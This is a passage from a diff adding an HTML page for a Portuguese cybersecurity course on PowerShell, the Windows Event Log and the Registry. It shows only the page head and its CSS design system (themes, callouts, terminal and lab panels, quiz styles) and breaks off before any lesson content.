@@ -1,0 +1,2975 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="study-slug" content="PowerShell-e-Windows-Interno">
+  <title>PowerShell, Event Log e Registro do Windows — Estudos de Cibersegurança</title>
+
+  <!-- Google Fonts: Barlow Semi Condensed, IBM Plex Sans, IBM Plex Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Barlow+Semi+Condensed:ital,wght@0,600;0,700;0,800;1,700&family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+
+  <style>
+/* ==========================================================================
+   ESTUDOS DE CIBERSEGURANÇA — DESIGN SYSTEM BASE (base.css)
+   Compatível com temas Claro / Escuro, responsivo e 100% offline-ready.
+   Tipografia: Barlow Semi Condensed, IBM Plex Sans, IBM Plex Mono.
+   ========================================================================== */
+
+/* --------------------------------------------------------------------------
+   0. Importação de Fontes Web (Google Fonts com Fallbacks Locais Nativos)
+   -------------------------------------------------------------------------- */
+@import url('https://fonts.googleapis.com/css2?family=Barlow+Semi+Condensed:ital,wght@0,600;0,700;0,800;1,700&family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap');
+
+/* --------------------------------------------------------------------------
+   1. Design Tokens & Variáveis CSS (Tema Claro - Padrão)
+   -------------------------------------------------------------------------- */
+:root {
+  /* Paleta Base */
+  --ground: #F3F6F7;
+  --surface: #FFFFFF;
+  --sunk: #E9EEF0;
+  --ink: #16242E;
+  --muted: #566672;
+  --rule: #D3DBE0;
+
+  /* Cores Temáticas das 10 Trilhas */
+  --t1-blue: #2563EB;     /* Trilha 1: Fundamentos & Princípios */
+  --t2-green: #059669;    /* Trilha 2: Defesa & Operações Blue Team */
+  --t3-red: #DC2626;      /* Trilha 3: Segurança Ofensiva & Red Team */
+  --t4-purple: #7C3AED;   /* Trilha 4: Engenharia, Cloud & AppSec */
+  --t5-cyan: #0891B2;     /* Trilha 5: Criptografia & Identidade */
+  --t6-amber: #D97706;    /* Trilha 6: Governança, Risco & Regulação */
+  --t7-rose: #DB2777;
+  --t8-slate: #475569;
+  --t9-indigo: #4F46E5;
+  --t10-orange: #C2410C;
+
+  /* Cores de Alerta / Callouts */
+  --tip-color: #059669;
+  --tip-bg: #ECFDF5;
+  --tip-border: #10B981;
+
+  --warning-color: #D97706;
+  --warning-bg: #FFFBEB;
+  --warning-border: #F59E0B;
+
+  --danger-color: #DC2626;
+  --danger-bg: #FEF2F2;
+  --danger-border: #EF4444;
+
+  --law-color: #7C3AED;
+  --law-bg: #F5F3FF;
+  --law-border: #8B5CF6;
+
+  /* Tipografia */
+  --font-display: "Barlow Semi Condensed", "Arial Narrow", Arial, sans-serif;
+  --font-body: "IBM Plex Sans", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  --font-mono: "IBM Plex Mono", Menlo, Monaco, Consolas, "Courier New", monospace;
+
+  /* Espaçamento e Bordas */
+  --radius-sm: 4px;
+  --radius-md: 8px;
+  --radius-lg: 12px;
+  --radius-pill: 9999px;
+  --radius: var(--radius-md);
+  --accent: var(--t1-blue);
+
+  /* Sombras */
+  --shadow-sm: 0 1px 2px rgba(15, 23, 28, 0.05);
+  --shadow-md: 0 4px 6px -1px rgba(15, 23, 28, 0.08), 0 2px 4px -2px rgba(15, 23, 28, 0.05);
+  --shadow-lg: 0 10px 15px -3px rgba(15, 23, 28, 0.1), 0 4px 6px -4px rgba(15, 23, 28, 0.05);
+
+  /* Transição */
+  --transition-fast: 0.15s ease-in-out;
+  --transition-normal: 0.25s ease-in-out;
+}
+
+/* --------------------------------------------------------------------------
+   2. Suporte a Tema Escuro (Modo Noturno / Dark Mode)
+   -------------------------------------------------------------------------- */
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --ground: #0F171C;
+    --surface: #172229;
+    --sunk: #1E2B33;
+    --ink: #E4EAED;
+    --muted: #9BABB6;
+    --rule: #2B3A44;
+
+    /* Trilhas no Dark Mode (ajuste de saturação e contraste) */
+    --t1-blue: #60A5FA;
+    --t2-green: #34D399;
+    --t3-red: #F87171;
+    --t4-purple: #A78BFA;
+    --t5-cyan: #22D3EE;
+    --t6-amber: #FBBF24;
+    --t7-rose: #F472B6;
+    --t8-slate: #94A3B8;
+    --t9-indigo: #818CF8;
+    --t10-orange: #FB923C;
+
+    /* Alertas no Dark Mode */
+    --tip-color: #34D399;
+    --tip-bg: rgba(5, 150, 105, 0.18);
+    --tip-border: #059669;
+
+    --warning-color: #FBBF24;
+    --warning-bg: rgba(217, 119, 6, 0.18);
+    --warning-border: #D97706;
+
+    --danger-color: #F87171;
+    --danger-bg: rgba(220, 38, 38, 0.20);
+    --danger-border: #DC2626;
+
+    --law-color: #A78BFA;
+    --law-bg: rgba(124, 58, 237, 0.18);
+    --law-border: #7C3AED;
+
+    --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.3);
+    --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.4);
+    --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+  }
+}
+
+:root[data-theme="dark"] {
+  --ground: #0F171C;
+  --surface: #172229;
+  --sunk: #1E2B33;
+  --ink: #E4EAED;
+  --muted: #9BABB6;
+  --rule: #2B3A44;
+
+  --t1-blue: #60A5FA;
+  --t2-green: #34D399;
+  --t3-red: #F87171;
+  --t4-purple: #A78BFA;
+  --t5-cyan: #22D3EE;
+  --t6-amber: #FBBF24;
+  --t7-rose: #F472B6;
+  --t8-slate: #94A3B8;
+  --t9-indigo: #818CF8;
+  --t10-orange: #FB923C;
+
+  --tip-color: #34D399;
+  --tip-bg: rgba(5, 150, 105, 0.18);
+  --tip-border: #059669;
+
+  --warning-color: #FBBF24;
+  --warning-bg: rgba(217, 119, 6, 0.18);
+  --warning-border: #D97706;
+
+  --danger-color: #F87171;
+  --danger-bg: rgba(220, 38, 38, 0.20);
+  --danger-border: #DC2626;
+
+  --law-color: #A78BFA;
+  --law-bg: rgba(124, 58, 237, 0.18);
+  --law-border: #7C3AED;
+
+  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.3);
+  --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.4);
+  --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+  --ground: #F3F6F7;
+  --surface: #FFFFFF;
+  --sunk: #E9EEF0;
+  --ink: #16242E;
+  --muted: #566672;
+  --rule: #D3DBE0;
+
+  --t1-blue: #2563EB;
+  --t2-green: #059669;
+  --t3-red: #DC2626;
+  --t4-purple: #7C3AED;
+  --t5-cyan: #0891B2;
+  --t6-amber: #D97706;
+  --t7-rose: #DB2777;
+  --t8-slate: #475569;
+  --t9-indigo: #4F46E5;
+  --t10-orange: #C2410C;
+
+  --tip-color: #059669;
+  --tip-bg: #ECFDF5;
+  --tip-border: #10B981;
+
+  --warning-color: #D97706;
+  --warning-bg: #FFFBEB;
+  --warning-border: #F59E0B;
+
+  --danger-color: #DC2626;
+  --danger-bg: #FEF2F2;
+  --danger-border: #EF4444;
+
+  --law-color: #7C3AED;
+  --law-bg: #F5F3FF;
+  --law-border: #8B5CF6;
+}
+
+/* --------------------------------------------------------------------------
+   3. Reset e Estilos Globais
+   -------------------------------------------------------------------------- */
+*, *::before, *::after {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+img, select, input, textarea {
+  max-width: 100%;
+}
+
+html {
+  font-size: 16px;
+  scroll-behavior: smooth;
+  color-scheme: light dark;
+}
+
+body {
+  background-color: var(--ground);
+  color: var(--ink);
+  font-family: var(--font-body);
+  font-size: 1rem;
+  line-height: 1.65;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  padding: 0;
+  margin: 0;
+  transition: background-color var(--transition-normal), color var(--transition-normal);
+}
+
+/* Tipografia Estrutural */
+h1, h2, h3, h4, h5, h6 {
+  font-family: var(--font-display);
+  font-weight: 700;
+  color: var(--ink);
+  line-height: 1.25;
+  margin-bottom: 0.75rem;
+  letter-spacing: -0.01em;
+}
+
+h1 { font-size: 2.25rem; }
+h2 { font-size: 1.75rem; margin-top: 2rem; border-bottom: 2px solid var(--rule); padding-bottom: 0.5rem; }
+h3 { font-size: 1.35rem; margin-top: 1.5rem; }
+h4 { font-size: 1.15rem; }
+
+p {
+  margin-bottom: 1rem;
+}
+
+a {
+  color: var(--t1-blue);
+  text-decoration: none;
+  font-weight: 500;
+  transition: opacity var(--transition-fast);
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+code, kbd, samp {
+  font-family: var(--font-mono);
+  font-size: 0.88em;
+  background-color: var(--sunk);
+  padding: 0.15rem 0.35rem;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--rule);
+}
+
+:not(pre) > code {
+  overflow-wrap: anywhere;
+}
+
+pre {
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  background-color: #0D1418;
+  color: #E2E8F0;
+  padding: 1rem;
+  border-radius: var(--radius-md);
+  overflow-x: auto;
+  line-height: 1.5;
+  margin-bottom: 1.25rem;
+}
+
+pre code {
+  background: transparent;
+  padding: 0;
+  border: none;
+  color: inherit;
+}
+
+/* --------------------------------------------------------------------------
+   4. Layout do Documento & Barra de Navegação Superior
+   -------------------------------------------------------------------------- */
+.top-nav {
+  background-color: var(--surface);
+  border-bottom: 1px solid var(--rule);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  backdrop-filter: blur(8px);
+}
+
+.top-nav-inner {
+  max-width: 960px;
+  margin: 0 auto;
+  padding: 0.75rem 1.25rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 1rem;
+}
+
+.nav-back {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.9rem;
+  color: var(--muted);
+  text-decoration: none;
+  font-weight: 600;
+  transition: color var(--transition-fast);
+}
+
+.nav-back:hover {
+  color: var(--ink);
+  text-decoration: none;
+}
+
+.nav-actions {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+}
+
+.theme-toggle-btn {
+  background: var(--sunk);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  padding: 0.4rem 0.75rem;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  font-size: 0.85rem;
+  font-weight: 600;
+  font-family: var(--font-body);
+  display: inline-flex;
+  align-items: center;
+  gap: 0.35rem;
+  transition: background-color var(--transition-fast), border-color var(--transition-fast);
+}
+
+.theme-toggle-btn:hover {
+  background: var(--surface);
+  border-color: var(--muted);
+}
+
+.container {
+  max-width: 960px;
+  margin: 0 auto;
+  padding: 1.75rem 1.25rem 4rem 1.25rem;
+}
+
+/* --------------------------------------------------------------------------
+   5. Cabeçalho de Destaque (.hero-header) e Metadados
+   -------------------------------------------------------------------------- */
+.hero-header {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-lg);
+  padding: 2rem;
+  margin-bottom: 2rem;
+  box-shadow: var(--shadow-sm);
+  position: relative;
+  overflow: hidden;
+}
+
+.hero-header::before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 5px;
+  background-color: var(--track-color, var(--t1-blue));
+}
+
+.badge {
+  display: inline-flex;
+  align-items: center;
+  padding: 0.25rem 0.75rem;
+  border-radius: var(--radius-pill);
+  font-family: var(--font-display);
+  font-size: 0.85rem;
+  font-weight: 700;
+  letter-spacing: 0.03em;
+  text-transform: uppercase;
+  margin-bottom: 0.75rem;
+  background-color: var(--sunk);
+  color: var(--ink);
+}
+
+.badge-t1 { background-color: rgba(37, 99, 235, 0.15); color: var(--t1-blue); }
+.badge-t2 { background-color: rgba(5, 150, 105, 0.15); color: var(--t2-green); }
+.badge-t3 { background-color: rgba(220, 38, 38, 0.15); color: var(--t3-red); }
+.badge-t4 { background-color: rgba(124, 58, 237, 0.15); color: var(--t4-purple); }
+.badge-t5 { background-color: rgba(8, 145, 178, 0.15); color: var(--t5-cyan); }
+.badge-t6 { background-color: rgba(217, 119, 6, 0.15); color: var(--t6-amber); }
+.badge-t7 { background-color: rgba(219, 39, 119, 0.15); color: var(--t7-rose); }
+.badge-t8 { background-color: rgba(71, 85, 105, 0.15); color: var(--t8-slate); }
+.badge-t9 { background-color: rgba(79, 70, 229, 0.15); color: var(--t9-indigo); }
+.badge-t10 { background-color: rgba(194, 65, 12, 0.15); color: var(--t10-orange); }
+
+.hero-subtitle {
+  font-size: 1.15rem;
+  color: var(--muted);
+  margin-bottom: 1.25rem;
+}
+
+.meta-bar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 1rem 1.5rem;
+  padding-top: 1rem;
+  border-top: 1px solid var(--rule);
+  font-size: 0.9rem;
+  color: var(--muted);
+}
+
+.meta-item {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.meta-item strong {
+  color: var(--ink);
+}
+
+/* --------------------------------------------------------------------------
+   6. Caixas de Destaque (.callout)
+   -------------------------------------------------------------------------- */
+.callout {
+  padding: 1.1rem 1.35rem;
+  margin: 1.5rem 0;
+  border-radius: var(--radius-md);
+  border-left: 5px solid var(--muted);
+  background-color: var(--sunk);
+  font-size: 0.97rem;
+  line-height: 1.6;
+}
+
+.callout p:last-child {
+  margin-bottom: 0;
+}
+
+.callout strong {
+  display: inline-block;
+  margin-bottom: 0.25rem;
+}
+
+.callout-tip, .callout.tip {
+  border-left-color: var(--tip-color);
+  background-color: var(--tip-bg);
+}
+
+.callout-warning, .callout.warning {
+  border-left-color: var(--warning-color);
+  background-color: var(--warning-bg);
+}
+
+.callout-danger, .callout.danger {
+  border-left-color: var(--danger-color);
+  background-color: var(--danger-bg);
+}
+
+.callout-law, .callout.law {
+  border-left-color: var(--law-color);
+  background-color: var(--law-bg);
+}
+
+/* --------------------------------------------------------------------------
+   7. Bloco Terminal / Comandos (.terminal-box)
+   -------------------------------------------------------------------------- */
+.terminal-box {
+  background-color: #0A0F13;
+  color: #E2E8F0;
+  border: 1px solid #1E293B;
+  border-radius: var(--radius-md);
+  margin: 1.5rem 0;
+  overflow: hidden;
+  box-shadow: var(--shadow-md);
+}
+
+.terminal-header {
+  background-color: #151E27;
+  padding: 0.5rem 0.85rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid #1E2B37;
+}
+
+.terminal-title {
+  font-family: var(--font-mono);
+  font-size: 0.8rem;
+  color: #94A3B8;
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.terminal-title::before {
+  content: "● ● ●";
+  letter-spacing: 0.15rem;
+  color: #475569;
+  font-size: 0.65rem;
+}
+
+.btn-copy {
+  background-color: #243242;
+  color: #CBD5E1;
+  border: 1px solid #334155;
+  border-radius: var(--radius-sm);
+  padding: 0.25rem 0.6rem;
+  font-size: 0.75rem;
+  font-family: var(--font-mono);
+  font-weight: 600;
+  cursor: pointer;
+  transition: all var(--transition-fast);
+}
+
+.btn-copy:hover {
+  background-color: #334155;
+  color: #FFFFFF;
+}
+
+.terminal-box pre {
+  margin: 0;
+  background-color: transparent;
+  border-radius: 0;
+  padding: 1rem;
+  color: #E2E8F0;
+}
+
+/* --------------------------------------------------------------------------
+   8. Simulador / Painel de Laboratório (.lab-box)
+   -------------------------------------------------------------------------- */
+.lab-box {
+  background-color: var(--surface);
+  border: 2px solid var(--rule);
+  border-radius: var(--radius-lg);
+  margin: 2rem 0;
+  overflow: hidden;
+  box-shadow: var(--shadow-md);
+}
+
+.lab-header {
+  background-color: var(--sunk);
+  padding: 1.25rem 1.5rem;
+  border-bottom: 1px solid var(--rule);
+}
+
+.lab-header h3 {
+  margin-top: 0;
+  margin-bottom: 0.35rem;
+  font-size: 1.3rem;
+  color: var(--ink);
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+
+.lab-header p {
+  color: var(--muted);
+  font-size: 0.95rem;
+  margin-bottom: 0;
+}
+
+.lab-body {
+  padding: 1.5rem;
+}
+
+.lab-controls {
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.25rem;
+  background-color: var(--ground);
+  padding: 1rem;
+  border-radius: var(--radius-md);
+  border: 1px solid var(--rule);
+}
+
+.lab-controls > * {
+  min-width: 0;
+  max-width: 100%;
+}
+
+.lab-controls label {
+  font-size: 0.9rem;
+  font-weight: 600;
+  color: var(--ink);
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.lab-controls input[type="text"],
+.lab-controls input[type="number"],
+.lab-controls select,
+.lab-controls textarea {
+  background-color: var(--surface);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-sm);
+  padding: 0.45rem 0.75rem;
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
+}
+
+.lab-controls input:focus,
+.lab-controls select:focus,
+.lab-controls textarea:focus {
+  outline: none;
+  border-color: var(--t1-blue);
+  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+}
+
+.lab-output {
+  background-color: #0B1116;
+  color: #38BDF8;
+  font-family: var(--font-mono);
+  font-size: 0.88rem;
+  padding: 1.25rem;
+  border-radius: var(--radius-md);
+  border: 1px solid #1E293B;
+  min-height: 100px;
+  max-height: 400px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.55;
+}
+
+/* Controles e Grid do Laboratório Interativo */
+.lab-controls-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 1.25rem;
+  padding: 1.5rem;
+  background-color: var(--ground);
+  border-bottom: 1px solid var(--rule);
+}
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  gap: 0.4rem;
+}
+
+.form-group.full-width {
+  grid-column: 1 / -1;
+}
+
+.form-group label {
+  font-size: 0.88rem;
+  font-weight: 600;
+  color: var(--ink);
+}
+
+.form-control {
+  background-color: var(--surface);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-sm);
+  padding: 0.55rem 0.85rem;
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
+}
+
+.form-control:focus {
+  outline: none;
+  border-color: var(--t1-blue);
+  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+}
+
+.form-range {
+  width: 100%;
+  accent-color: var(--t1-blue);
+  cursor: pointer;
+}
+
+.flags-btn-group {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.6rem;
+  margin-top: 0.25rem;
+}
+
+.flag-toggle {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-sm);
+  padding: 0.35rem 0.75rem;
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  font-weight: 600;
+  cursor: pointer;
+  user-select: none;
+  transition: all var(--transition-fast);
+}
+
+.flag-toggle:hover {
+  border-color: var(--t1-blue);
+}
+
+.flag-toggle input[type="checkbox"] {
+  accent-color: var(--t1-blue);
+  cursor: pointer;
+}
+
+.lab-actions-bar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  padding: 1.25rem 1.5rem;
+  background-color: var(--surface);
+  border-bottom: 1px solid var(--rule);
+}
+
+.packet-display-wrap {
+  padding: 1.5rem;
+  background-color: var(--surface);
+}
+
+.packet-display-wrap h4 {
+  margin-top: 0;
+  margin-bottom: 1rem;
+  font-size: 1.05rem;
+  color: var(--ink);
+}
+
+.packet-header-grid {
+  display: grid;
+  grid-template-columns: repeat(32, 1fr);
+  gap: 4px;
+  background-color: var(--ground);
+  padding: 0.75rem;
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  overflow-x: auto;
+}
+
+.header-field-cell {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-sm);
+  padding: 0.5rem 0.6rem;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  min-width: 75px;
+}
+
+.header-field-cell.span-8 {
+  grid-column: span 8;
+}
+
+.header-field-cell.span-16 {
+  grid-column: span 16;
+}
+
+.header-field-cell.span-32 {
+  grid-column: span 32;
+}
+
+.header-field-cell .field-title {
+  font-size: 0.72rem;
+  font-family: var(--font-mono);
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+  margin-bottom: 0.2rem;
+}
+
+.header-field-cell .field-val {
+  font-size: 0.88rem;
+  font-family: var(--font-mono);
+  font-weight: 600;
+  color: var(--ink);
+}
+
+.header-field-cell .field-val.highlight {
+  color: var(--t1-blue);
+}
+
+.header-field-cell .field-val.flag-badge {
+  background-color: var(--sunk);
+  padding: 0.15rem 0.45rem;
+  border-radius: var(--radius-sm);
+  font-size: 0.8rem;
+}
+
+@media (max-width: 768px) {
+  .packet-header-grid {
+    grid-template-columns: repeat(16, 1fr);
+  }
+  .header-field-cell.span-8 {
+    grid-column: span 16;
+  }
+}
+
+.edr-grid-container {
+  grid-template-columns: 1fr 1fr;
+}
+
+
+/* --------------------------------------------------------------------------
+   9. Botões e Controles Padrão
+   -------------------------------------------------------------------------- */
+.btn-primary {
+  background-color: var(--t1-blue);
+  color: #FFFFFF;
+  border: none;
+  border-radius: var(--radius-md);
+  padding: 0.55rem 1.15rem;
+  font-family: var(--font-body);
+  font-size: 0.92rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background-color var(--transition-fast), transform var(--transition-fast);
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.btn-primary:hover {
+  filter: brightness(1.1);
+  transform: translateY(-1px);
+}
+
+.btn-primary:active {
+  transform: translateY(0);
+}
+
+.btn-secondary {
+  background-color: var(--sunk);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  padding: 0.55rem 1.15rem;
+  font-family: var(--font-body);
+  font-size: 0.92rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all var(--transition-fast);
+}
+
+.btn-secondary:hover {
+  background-color: var(--surface);
+  border-color: var(--muted);
+}
+
+/* --------------------------------------------------------------------------
+   10. Lista de Verificação Interativa (.checklist)
+   -------------------------------------------------------------------------- */
+.checklist {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-lg);
+  padding: 1.5rem;
+  margin: 1.75rem 0;
+  box-shadow: var(--shadow-sm);
+}
+
+.checklist h4 {
+  font-size: 1.15rem;
+  margin-bottom: 0.5rem;
+  color: var(--ink);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.checklist-progress-bar {
+  width: 100%;
+  height: 6px;
+  background-color: var(--sunk);
+  border-radius: var(--radius-pill);
+  margin-bottom: 1rem;
+  overflow: hidden;
+}
+
+.checklist-progress-fill {
+  height: 100%;
+  background-color: var(--t2-green);
+  width: 0%;
+  transition: width 0.3s ease;
+}
+
+.check-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 0.75rem;
+  padding: 0.65rem 0.75rem;
+  margin: 0.25rem 0;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  user-select: none;
+  transition: background-color var(--transition-fast);
+}
+
+.check-item:hover {
+  background-color: var(--sunk);
+}
+
+.check-item input[type="checkbox"] {
+  appearance: none;
+  -webkit-appearance: none;
+  width: 1.25rem;
+  height: 1.25rem;
+  border: 2px solid var(--muted);
+  border-radius: var(--radius-sm);
+  background-color: var(--surface);
+  cursor: pointer;
+  flex-shrink: 0;
+  margin-top: 0.15rem;
+  position: relative;
+  transition: all var(--transition-fast);
+}
+
+.check-item input[type="checkbox"]:checked {
+  background-color: var(--t2-green);
+  border-color: var(--t2-green);
+}
+
+.check-item input[type="checkbox"]:checked::after {
+  content: "";
+  position: absolute;
+  left: 5px;
+  top: 1px;
+  width: 4px;
+  height: 8px;
+  border: solid white;
+  border-width: 0 2px 2px 0;
+  transform: rotate(45deg);
+}
+
+.check-item span {
+  font-size: 0.95rem;
+  color: var(--ink);
+  line-height: 1.45;
+  transition: color var(--transition-fast);
+}
+
+.check-item.completed span {
+  text-decoration: line-through;
+  color: var(--muted);
+}
+
+/* --------------------------------------------------------------------------
+   11. Quiz de Fixação (.quiz, .quiz-item, .quiz-section)
+   -------------------------------------------------------------------------- */
+.quiz-section {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-lg);
+  padding: 1.75rem;
+  margin: 2rem 0;
+  box-shadow: var(--shadow-sm);
+}
+
+.quiz-section h3 {
+  margin-top: 0;
+  margin-bottom: 1rem;
+}
+
+.quiz-item {
+  background-color: var(--sunk);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  padding: 1.25rem;
+  margin-bottom: 1.25rem;
+}
+
+.quiz-question {
+  font-weight: 600;
+  font-size: 1rem;
+  color: var(--ink);
+  margin-bottom: 0.85rem;
+}
+
+.quiz-options {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+  margin-bottom: 0.75rem;
+}
+
+.quiz-btn {
+  background-color: var(--surface);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  padding: 0.75rem 1rem;
+  text-align: left;
+  font-family: var(--font-body);
+  font-size: 0.92rem;
+  cursor: pointer;
+  transition: all var(--transition-fast);
+  line-height: 1.4;
+}
+
+.quiz-btn:hover:not(:disabled) {
+  border-color: var(--t1-blue);
+  background-color: var(--ground);
+}
+
+.quiz-btn.correct {
+  background-color: var(--tip-bg) !important;
+  border-color: var(--t2-green) !important;
+  color: var(--t2-green) !important;
+  font-weight: 600;
+}
+
+.quiz-btn.incorrect {
+  background-color: var(--danger-bg) !important;
+  border-color: var(--danger-color) !important;
+  color: var(--danger-color) !important;
+}
+
+.quiz-feedback {
+  padding: 0.85rem 1rem;
+  border-radius: var(--radius-md);
+  font-size: 0.9rem;
+  line-height: 1.5;
+  margin-top: 0.75rem;
+  border-left: 4px solid var(--rule);
+  background-color: var(--surface);
+}
+
+.quiz-feedback.correct {
+  border-left-color: var(--t2-green);
+  background-color: var(--tip-bg);
+  color: var(--ink);
+}
+
+.quiz-feedback.incorrect {
+  border-left-color: var(--danger-color);
+  background-color: var(--danger-bg);
+  color: var(--ink);
+}
+
+/* --------------------------------------------------------------------------
+   12. Grade de Fatos / Cards Comparativos (.facts-grid, .facts-card)
+   -------------------------------------------------------------------------- */
+.facts-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 1.25rem;
+  margin: 1.5rem 0;
+}
+
+.facts-card {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  padding: 1.25rem;
+  box-shadow: var(--shadow-sm);
+  transition: transform var(--transition-fast), box-shadow var(--transition-fast);
+}
+
+.facts-card:hover {
+  transform: translateY(-2px);
+  box-shadow: var(--shadow-md);
+}
+
+.facts-card h4 {
+  font-size: 1.1rem;
+  margin-bottom: 0.5rem;
+  color: var(--ink);
+}
+
+.facts-card p {
+  color: var(--muted);
+  font-size: 0.92rem;
+  margin-bottom: 0;
+}
+
+/* --------------------------------------------------------------------------
+   13. Tabelas Técnicas Comparativas
+   -------------------------------------------------------------------------- */
+.table-responsive {
+  width: 100%;
+  overflow-x: auto;
+  margin: 1.5rem 0;
+  border-radius: var(--radius-md);
+  border: 1px solid var(--rule);
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.92rem;
+  background-color: var(--surface);
+  text-align: left;
+}
+
+th, td {
+  padding: 0.75rem 1rem;
+  border-bottom: 1px solid var(--rule);
+}
+
+th {
+  background-color: var(--sunk);
+  font-family: var(--font-display);
+  font-weight: 700;
+  color: var(--ink);
+  letter-spacing: 0.02em;
+}
+
+tr:last-child td {
+  border-bottom: none;
+}
+
+tr:hover td {
+  background-color: var(--ground);
+}
+
+/* --------------------------------------------------------------------------
+   14. Diagramas de Arquitetura e Fluxo (Mermaid pré-compilado em SVG)
+   -------------------------------------------------------------------------- */
+.diagram-box {
+  background: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius);
+  margin: 1.5rem 0;
+  overflow: hidden;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+}
+
+.diagram-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 0.65rem 1rem;
+  background: var(--ground);
+  border-bottom: 1px solid var(--rule);
+  font-size: 0.825rem;
+  font-weight: 600;
+  color: var(--muted);
+}
+
+.diagram-title {
+  font-family: var(--font-display);
+  font-weight: 700;
+  color: var(--ink);
+  letter-spacing: 0.02em;
+}
+
+.diagram-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.35rem;
+  background: rgba(37, 99, 235, 0.15);
+  color: var(--accent);
+  border: 1px solid rgba(37, 99, 235, 0.3);
+  padding: 0.15rem 0.5rem;
+  border-radius: var(--radius-pill);
+  font-size: 0.725rem;
+  font-family: var(--font-mono);
+}
+
+.diagram-svg-wrap {
+  padding: 1.5rem;
+  overflow-x: auto;
+  -webkit-overflow-scrolling: touch;
+  text-align: center;
+  background: var(--surface);
+}
+
+.diagram-svg-wrap svg {
+  max-width: 100%;
+  height: auto;
+  display: inline-block;
